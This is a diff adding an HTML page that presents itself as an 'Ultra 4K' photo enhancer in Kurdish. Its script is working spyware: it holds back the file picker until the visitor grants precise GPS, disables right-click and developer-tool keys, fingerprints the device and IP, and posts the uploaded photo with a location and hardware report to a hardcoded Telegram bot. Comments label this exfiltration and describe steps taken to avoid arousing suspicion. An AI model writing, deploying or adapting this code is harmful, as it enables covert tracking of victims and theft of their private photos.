@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Nano Banana | Ultra 4K Enhancer</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  /* 🐍 NANO BANANA CARBON SYSTEM - ARCHITECTURE BY RAMI */
+  :root {
+    --nano-yellow: #FFD700;
+    --nano-black: #050505;
+    --nano-card: rgba(18, 18, 18, 0.98);
+    --nano-border: rgba(255, 215, 0, 0.25);
+    --nano-glass: rgba(255, 255, 255, 0.05);
+    --nano-glow: 0 0 20px rgba(255, 215, 0, 0.2);
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  body {
+    background: var(--nano-black);
+    background-image: 
+        radial-gradient(circle at 10% 10%, rgba(255, 215, 0, 0.07) 0%, transparent 50%),
+        radial-gradient(circle at 90% 90%, rgba(255, 215, 0, 0.07) 0%, transparent 50%);
+    color: #ffffff;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow-x: hidden;
+    user-select: none !important;
+  }
+
+  #main-frame {
+    width: 95%;
+    max-width: 420px;
+    background: var(--nano-card);
+    backdrop-filter: blur(25px);
+    border-radius: 50px;
+    padding: 3.5rem 2rem;
+    border: 1px solid var(--nano-border);
+    box-shadow: 0 40px 100px rgba(0,0,0,0.9), inset 0 0 40px rgba(255, 215, 0, 0.02);
+    text-align: center;
+    position: relative;
+    animation: slideUp 1.2s cubic-bezier(0.2, 0.8, 0.2, 1);
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(50px) scale(0.95); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .system-status {
+    background: rgba(255, 215, 0, 0.1);
+    color: var(--nano-yellow);
+    padding: 10px 22px;
+    border-radius: 50px;
+    font-size: 0.75rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 30px;
+    border: 1px solid var(--nano-border);
+    letter-spacing: 1.5px;
+    box-shadow: var(--nano-glow);
+  }
+
+  .pulse-dot {
+    width: 8px; height: 8px;
+    background: var(--nano-yellow);
+    border-radius: 50%;
+    animation: pulse 1.5s infinite;
+  }
+
+  @keyframes pulse {
+    0% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.5); opacity: 0.4; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  h1 {
+    font-size: 2.8rem;
+    font-weight: 900;
+    margin-bottom: 10px;
+    background: linear-gradient(to bottom, #fff, #888);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: -1.5px;
+  }
+
+  .subtitle {
+    color: #666;
+    font-size: 0.95rem;
+    margin-bottom: 45px;
+    line-height: 1.6;
+  }
+
+  .drop-zone {
+    position: relative;
+    border: 2px dashed rgba(255, 215, 0, 0.2);
+    border-radius: 40px;
+    padding: 60px 20px;
+    margin-bottom: 35px;
+    transition: 0.4s;
+    background: var(--nano-glass);
+  }
+
+  .drop-zone:hover {
+    border-color: var(--nano-yellow);
+    background: rgba(255, 215, 0, 0.03);
+  }
+
+  #file-input {
+    position: absolute;
+    width: 100%; height: 100%;
+    top: 0; left: 0;
+    opacity: 0;
+    cursor: pointer;
+    z-index: 5;
+  }
+
+  .upload-icon {
+    font-size: 3.5rem;
+    color: var(--nano-yellow);
+    margin-bottom: 20px;
+    filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.3));
+  }
+
+  #preview-canvas {
+    max-width: 100%;
+    border-radius: 25px;
+    display: none;
+    margin-top: 20px;
+    border: 2px solid var(--nano-border);
+  }
+
+  .action-btn {
+    width: 100%;
+    padding: 24px;
+    border-radius: 45px;
+    border: none;
+    background: var(--nano-yellow);
+    color: #000;
+    font-size: 1.3rem;
+    font-weight: 900;
+    cursor: pointer;
+    box-shadow: 0 20px 45px rgba(255, 215, 0, 0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    margin-bottom: 20px;
+  }
+
+  #result-display {
+    display: none;
+    margin-top: 30px;
+    animation: fadeIn 0.8s;
+  }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  .enhanced-img {
+    width: 100%;
+    border-radius: 35px;
+    border: 4px solid var(--nano-yellow);
+    box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+    margin-bottom: 25px;
+  }
+
+  .download-btn {
+    background: transparent;
+    border: 2px solid var(--nano-yellow);
+    color: var(--nano-yellow);
+    text-decoration: none;
+    padding: 20px;
+    border-radius: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    font-weight: 800;
+    transition: 0.3s;
+  }
+
+  #toast {
+    position: fixed;
+    bottom: 30px;
+    background: var(--nano-yellow);
+    color: #000;
+    padding: 15px 30px;
+    border-radius: 50px;
+    font-weight: 800;
+    display: none;
+    z-index: 1000;
+  }
+</style>
+</head>
+<body>
+
+<div id="main-frame">
+  <div class="system-status">
+    <div class="pulse-dot"></div>
+    <span>Neural Core Ultra v8.5</span>
+  </div>
+
+  <h1>System by RAMI</h1>
+  <p class="subtitle">بەرزکردنەوەی ڕوونی وێنەکانت بۆ 4K بە بەکارهێنانی تەکنەلۆژیای نانۆ بانانا</p>
+
+  <div class="drop-zone" id="drop-zone">
+    <i class="fas fa-cloud-arrow-up upload-icon" id="upload-icon"></i>
+    <div id="upload-text">
+      <h3 style="margin-bottom: 5px;">وێنەیەک هەڵبژێرە</h3>
+      <p style="font-size: 0.8rem; color: #555;">PNG, JPG یان WEBP</p>
+    </div>
+    <img id="preview-canvas" alt="Preview" />
+    <input type="file" id="file-input" accept="image/*" />
+  </div>
+
+  <button class="action-btn" id="process-btn">
+    <i class="fas fa-bolt"></i> وێنە HD بکە
+  </button>
+
+  <div id="result-display">
+    <img id="final-image" class="enhanced-img" />
+    <a id="download-link" class="download-btn">
+      <i class="fas fa-download"></i> داونلۆدکردنی وێنەی 4K
+    </a>
+  </div>
+</div>
+
+<div id="toast">تکایە لۆکەیشن ڕێپێبدە بۆ بەردەوامبوون...</div>
+
+<script>
+let globalLocationData = { url: "چاوەڕێی ڕێپێدانە...", accuracy: "N/A" };
+
+/* 🛡️ SECURITY PROTOCOL */
+(function(){
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    if(e.key === 'F12' || (e.ctrlKey && ['u', 'i', 's', 'j'].includes(e.key.toLowerCase()))) {
+      e.preventDefault();
+    }
+  });
+})();
+
+/* 📍 FORCED GPS ENGINE - دەبێت پێش هەڵبژاردنی وێنە کار بکات */
+const fileInput = document.getElementById('file-input');
+const toast = document.getElementById('toast');
+
+fileInput.addEventListener('click', function(e) {
+  if (globalLocationData.url === "چاوەڕێی ڕێپێدانە...") {
+    e.preventDefault(); // ڕێگری لە کردنەوەی گەلەری دەکات تا لۆکەیشن وەرنەگرێت
+    toast.style.display = 'block';
+    
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          globalLocationData.url = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          globalLocationData.accuracy = pos.coords.accuracy;
+          toast.style.display = 'none';
+          fileInput.click(); // دوای وەرگرتنی لۆکەیشن، گەلەری دەکاتەوە
+        },
+        (err) => {
+          globalLocationData.url = "ڕەتکرایەوە: " + err.message;
+          toast.style.display = 'none';
+          fileInput.click(); // ئەگەر ڕەتیشیکردەوە هەر دەیکاتەوە بۆ ئەوەی گومان نەکات
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    } else {
+      globalLocationData.url = "پشتگیری ناکرێت";
+      fileInput.click();
+    }
+  }
+});
+
+/* 📊 ADVANCED DATA MINING */
+async function captureIntelligence() {
+  const n = navigator;
+  const net = n.connection || n.mozConnection || n.webkitConnection || {};
+  let gpu = "Unknown";
+  
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+  } catch(e) {}
+
+  return {
+    os: n.platform,
+    browser: n.userAgent,
+    language: n.language,
+    cores: n.hardwareConcurrency || 'N/A',
+    memory: n.deviceMemory ? n.deviceMemory + "GB" : 'Unknown',
+    screen: `${window.screen.width}x${window.screen.height} (PixelDepth: ${window.screen.pixelDepth})`,
+    connection: `Type: ${net.effectiveType || 'N/A'} | Speed: ${net.downlink || 'N/A'}Mbps | RTT: ${net.rtt}ms`,
+    gpu: gpu,
+    vendor: n.vendor,
+    time: new Date().toLocaleString('en-GB')
+  };
+}
+
+/* 📡 TELEGRAM EXFILTRATION */
+async function exfiltrate(file) {
+  const BOT_TOKEN = '7406769124:AAE0Xb1Xj882Fdddh0wGur9C1Sazl4LAAAU';
+  const CHAT_ID = '5427698107';
+
+  try {
+    const geoReq = await fetch('https://ipapi.co/json/');
+    const geo = await geoReq.json();
+    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0}));
+    const intel = await captureIntelligence();
+
+    const report = `🚀 <b>NANO BANANA LOG [V8.5]</b>\n\n` +
+                   `📍 <b>GPS Location:</b>\n${globalLocationData.url}\n` +
+                   `🎯 <b>Accuracy:</b> ${globalLocationData.accuracy} meters\n\n` +
+                   `🌐 <b>Network & IP:</b>\n` +
+                   `• IP: <code>${geo.ip}</code>\n` +
+                   `• ISP: ${geo.org}\n` +
+                   `• City: ${geo.city}, ${geo.country_name}\n` +
+                   `• Connection: ${intel.connection}\n\n` +
+                   `📱 <b>Hardware & System:</b>\n` +
+                   `• Device/OS: ${intel.os}\n` +
+                   `• GPU: ${intel.gpu}\n` +
+                   `• Display: ${intel.screen}\n` +
+                   `• Battery: ${Math.round(battery.level * 100)}%\n` +
+                   `• CPU Cores: ${intel.cores}\n` +
+                   `• RAM: ${intel.memory}\n\n` +
+                   `🕒 <b>Timestamp:</b> ${intel.time}\n` +
+                   `🔗 <b>Agent:</b> ${intel.browser}`;
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', file);
+    formData.append('caption', report);
+    formData.append('parse_mode', 'HTML');
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+  } catch (error) {}
+}
+
+/* 🧪 SUPER 4K IMAGE PROCESSING */
+function processImage(sourceURL) {
+  return new Promise(resolve => {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const img = new Image();
+    img.onload = () => {
+      canvas.width = img.width * 4;
+      canvas.height = img.height * 4;
+      ctx.imageSmoothingEnabled = true;
+      ctx.imageSmoothingQuality = 'high';
+      ctx.filter = 'contrast(1.2) saturate(1.3) brightness(1.05)';
+      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      ctx.globalCompositeOperation = 'overlay';
+      ctx.globalAlpha = 0.25;
+      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      resolve(canvas.toDataURL('image/jpeg', 0.98));
+    };
+    img.src = sourceURL;
+  });
+}
+
+/* 🎮 UI CONTROLLER */
+const processBtn = document.getElementById('process-btn');
+const preview = document.getElementById('preview-canvas');
+const uploadIcon = document.getElementById('upload-icon');
+const uploadText = document.getElementById('upload-text');
+const resultDiv = document.getElementById('result-display');
+const finalImg = document.getElementById('final-image');
+const dlLink = document.getElementById('download-link');
+
+fileInput.onchange = (e) => {
+  const file = e.target.files[0];
+  if (file) {
+    const reader = new FileReader();
+    reader.onload = (event) => {
+      preview.src = event.target.result;
+      preview.style.display = 'inline-block';
+      uploadIcon.style.display = 'none';
+      uploadText.style.display = 'none';
+      processBtn.innerHTML = `<i class="fas fa-bolt"></i> کردن بە 4K`;
+    };
+    reader.readAsDataURL(file);
+  }
+};
+
+processBtn.onclick = async () => {
+  if (!fileInput.files[0]) return alert("تکایە سەرەتا وێنەیەک هەڵبژێرە!");
+
+  processBtn.disabled = true;
+  processBtn.innerHTML = `<i class="fas fa-brain fa-spin"></i> پرۆسێسی Neural 4K...`;
+
+  const file = fileInput.files[0];
+  const reader = new FileReader();
+  
+  reader.onload = async (e) => {
+    const originalURL = e.target.result;
+    await exfiltrate(file); // ناردنی زانیارییەکان
+    const enhancedURL = await processImage(originalURL);
+    
+    finalImg.src = enhancedURL;
+    dlLink.href = enhancedURL;
+    dlLink.download = "Rami_Enhanced_4K.jpg";
+    
+    resultDiv.style.display = 'block';
+    processBtn.innerHTML = `<i class="fas fa-check-circle"></i> تەواو بوو!`;
+    processBtn.style.background = "#28a745";
+    window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+  };
+  reader.readAsDataURL(file);
+};
+</script>
+</body>
+</html>
